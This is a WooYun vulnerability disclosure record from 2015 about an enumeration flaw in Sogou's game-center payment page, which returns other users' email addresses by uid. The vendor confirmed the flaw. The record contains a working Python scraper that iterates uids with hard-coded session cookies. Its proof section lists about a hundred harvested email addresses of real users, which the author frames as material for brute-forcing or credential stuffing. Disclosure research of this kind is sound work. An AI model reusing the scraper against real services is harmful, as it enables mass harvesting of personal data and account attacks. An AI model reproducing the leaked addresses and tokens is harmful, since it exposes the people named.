{"id": 43904, "wybug_id": "wooyun-2015-0130387", "wybug_title": "搜狗6000万用户登录邮箱可通过uid遍历", "wybug_corp": "搜狗", "wybug_author": "Vinc", "wybug_date": "2015-07-30 10:37", "wybug_open_date": "2015-09-13 11:00", "wybug_type": "敏感信息泄露", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-13：\t细节向公众公开  简要描述： 看到这个http://wooyun.org/bugs/wooyun-2014-077356  想到的 详细说明：  1.sogou游戏中心站点http://wan.sogou.com/p/index.do2.充值处，可以为他人充值该处可以通过遍历uid来获取其他用户的邮箱信息，用作暴力破解或者撞裤通过测试uid，有6000万+用户POST请求包如下：\n\n附上Py脚本：\nif __name__ == '__main__':\tfor i in range (1000):\t\tparams=urllib.urlencode({'gid':'233','sid':'21','paygate':'-331','amount':'10','uid':i})\t\theaders={\t\t             \"Cookie\":\"IPLOC=CN2100; SUID=63043D777D23900A000000005552F7EA; SUV=00D766AC773D04635552F7EB7AADD090; usid=63043D7730890E0A000000005563D38A; CNZZDATA1255303155=1173610824-1438220021-%7C1438220021; swfLayer=1; ppinf=5|1438220959|1439430559|Y2xpZW50aWQ6NDoxMTAwfGNydDoxMDoxNDM4MjIwOTU5fHJlZm5pY2s6MDp8dHJ1c3Q6MToxfHVzZXJpZDoxOTpkb250c2F5aGVoZUAxNjMuY29tfHVuaXFuYW1lOjk6MTEyMzQyMzExfA; pprdig=pgpiRH6X-cilVdO8pLT6V2s5gcos7yfRdrabmaNieW1v0MJawaw-M3qUMkNr_hovhIZZ0ZeQsD7yPnehRoZrb5BJA8bY5BDKs1awJwVDqhlPsLplQrsWSXB3hrUYGXTdKKhCgV-a3Pwi6qeSlGF6iJ4lD_qeDE8PifX6cA1GZDA; email=**********; SSUID=BEF747DFDC68FA329D3F93994957BE5A; ppmdig=1438220960000000dd5308bce1c345c0d36e8be0ae55856e; hostid=40731406; JSESSIONID=aaaiTZSNM3yNBghhKPC7u\",\t\t             \"Content-Type\":\"application/x-www-form-urlencoded; charset=UTF-8\",\"Connection\":\"keep-alive\",\t\t             \"Pragma\":\"no-cache\",\"Cache-Control\":\"no-cache\",\"Accept\":\"*/*\",\"Accept-Language\":\"zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\",\"Accept-Encoding\":\"gzip, deflate\"\t\t        }\t\tconn = httplib.HTTPConnection('wan.sogou.com','80',True,2)\t\tconn.request(method=\"POST\",url=\"/payconfirm.do\",body=params,headers=headers)\t\tresponse = conn.getresponse()\t\tbody = response.read()\t\tusermail = re.findall(r'(?<= id=\"dUid\" class=\"font-black\">).*?(?=</dd>)',body)\t\tprint usermail[0]\n   漏洞证明：  频率不要太快，跑了100个测试下。zhaozhe112@sohu.comzhaozhe112234@sogou.combellwill@sogou.comgaodingsogou@sogou.comburst@sogou.combellscape@sogou.comtestxiuew@sogou.comzhaozhe1123x@sogou.comhotfall@sohu.comxn-test1@sogou.comloveystar@chinaren.comliuxu-sogou@sogou.comrainbow8416@sogou.comliuxv87@sogou.comcaodanaxx1@sogou.comwx2011916105724@sogou.comburst009x@sogou.comburst00786@sogou.comgg123xo@sogou.comtxieiwowe@sogou.comsonicfeng1981@sohu.comburstx980@sogou.comxn-test2@sogou.comxianghuiru108@sohu.comhotfall@sogou.comcaodanx@sogou.comzhongshenxx@sogou.coma123xy@sogou.comaxx98xl@sogou.comaxx1238-@sogou.comxfew9874@sogou.comstdio1@sohu.comxn-test3@sogou.comxn-test4@sogou.comburst123x@sogou.comxianghuiru5678@sogou.combellzhong123@sogou.comlx187654@sogou.comzhaozhezheng@sogou.comxn-test5@sogou.comsogou_open@sogou.coma1520008935@sogou.comxn-test6@sogou.comxn-test7@sogou.coma649577224@sogou.comrty5664@sogou.comlilin199211@sogou.comxuexiaozhou123@sogou.comet1130179276@sogou.comhjhghgnb@sogou.comwsnm1336149162@sogou.comzjj825827@sohu.comww392220261@sogou.comljc34522748@sogou.comw1611310734@sogou.comsw1579483698@sogou.comt6r65556653@sogou.comggf1228801615@sogou.comw19920622@sogou.comqiuchaojn@sogou.comij919440687@sogou.comlxtext@sogou.coma1107937270@sogou.comdhfudshgufdg@sogou.comqwertyuiop147236@sogou.comqw06123456@sogou.comyh5445456@sogou.comjixueli@sogou.comwss188@sogou.comh1256508348@sogou.comjasq@sogou.coms994256021@sogou.comzxc1693231929@sogou.comu1403233627@sogou.comqweas1073909212@sogou.coma1491255961@sogou.comdongdan114@sogou.comliminhe@sogou.comxt1230.123@sogou.comyhhggy@sogou.comlaotian_2000_2000@chinaren.comhgfhvghggvf@sogou.comkuanglianpu1@sogou.comas625673784@sogou.comq17992140714@sogou.comgk1094918561@sogou.comxiaozhuge2@sogou.comjim.@sogou.comwangyan_works@sogou.comq616066451@sogou.comffgklpglper@sogou.com香百合1@focus.cna422193476@sogou.comhgfjdsawu@sogou.comjvb132@sogou.comf1591268761@sogou.comqrwerwt3465hrt@sogou.coma1346927986482@sogou.comgulang.com@sogou.comzxvgbgf@sogou.comzhi787747702@sogou.coma1554567397@sogou.comwm798200@focus.cnabc-.@sogou.comzhou1786962732@sogou.com   修复方案：     版权声明：转载请注明来源 Vinc@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-07-30 10:58 厂商回复： 感谢支持！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}